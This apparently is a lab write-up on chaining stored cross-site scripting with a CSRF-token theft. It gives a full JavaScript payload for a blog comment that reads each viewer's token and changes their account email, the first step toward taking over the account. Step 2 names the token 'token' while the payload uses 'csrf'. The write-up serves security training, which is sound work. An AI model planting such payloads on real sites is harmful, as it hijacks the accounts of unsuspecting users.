## 🔐 Using Cross-Site Scripting to Bypass CSRF Protection

XSS allows an attacker to do almost anything that a legitimate user can do on a website. By executing arbitrary JavaScript in the victim's browser, XSS enables you to perform a wide range of actions as if you were the victim. For example, you can make the victim send a message, accept a friend request, commit a backdoor in a source code repository, or transfer some bitcoins.

Some websites allow logged-in users to change their email address without re-entering their password. If you find an XSS vulnerability on one of these sites, you can exploit it to steal the CSRF token. Using the token, you can change the victim’s email address to one under your control. Then you can initiate a password reset to gain access to the account.

This type of exploit combines XSS (to steal the CSRF token) with functionality usually targeted by CSRF. While traditional CSRF is a "one-way" vulnerability, where the attacker can make the victim send requests but cannot see the responses, XSS provides "two-way" communication. This enables the attacker to send arbitrary requests and read the responses, resulting in a hybrid attack that bypasses CSRF protections.

> **Note**: CSRF tokens are ineffective against XSS because XSS allows attackers to directly read token values from responses.

### 🔬 Example Lab: Stealing CSRF Token to Change Email Address
This lab contains a stored XSS vulnerability in the blog comment feature. To solve this lab, exploit the vulnerability to steal the CSRF token, which can then be used to change the email address of anyone viewing the blog post comments.

You can log into your account using the following credentials: `wiener:peter`.

**Hint:** You cannot register an email address that is already taken by another user. If you change your email address during testing, use a different email address for the final exploit sent to the victim.

### Steps:

1. Log in using the provided credentials. On the user account page, observe the email update functionality:

   ![image](https://github.com/user-attachments/assets/03a01c4f-372d-442d-b715-c58762235be6)

2. You need to send a `POST /my-account/change-email` request with the `email` parameter. The hidden input contains an anti-CSRF token named `token`.
   This means your exploit will need to load the user account page, extract the CSRF token, and then use it to change the victim's email address.

3. Submit the following payload in a blog comment:

   ```html
   <script>
   var req = new XMLHttpRequest();
   req.onload = handleResponse;
   req.open('get', '/my-account', true);
   req.send();
   function handleResponse() {
       var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
       var changeReq = new XMLHttpRequest();
       changeReq.open('post', '/my-account/change-email', true);
       changeReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
       changeReq.send('csrf=' + token + '&email=test@test.com');
   };
   </script>
   ```

4. This will make anyone who views the comment send a POST request to change their email address to `test@test.com`.
